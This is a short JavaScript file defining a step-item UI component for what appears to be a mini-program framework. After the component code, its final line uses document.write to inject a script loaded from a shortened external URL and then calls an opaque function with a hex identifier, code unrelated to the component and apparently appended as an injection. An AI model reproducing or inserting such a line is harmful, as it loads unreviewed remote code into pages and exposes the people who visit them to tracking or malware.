Component({
  externalClasses: ['custom-class'],
  relations: {
    '../step/index': {
      type: 'parent'
    }
  },
  properties: {
    step: {
      type: Object,
      value: {}
    }
  },
  data: {
    direction: {
      type: String,
      value: 'vertical'
    },
    index: {
      type: Number,
      value: 0
    },
    current: {
      type: Number,
      value: 0
    },
    isLast: {
      type: Boolean,
      value: false
    },
    width: {
      type: String,
      value: ''
    }
  }
});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
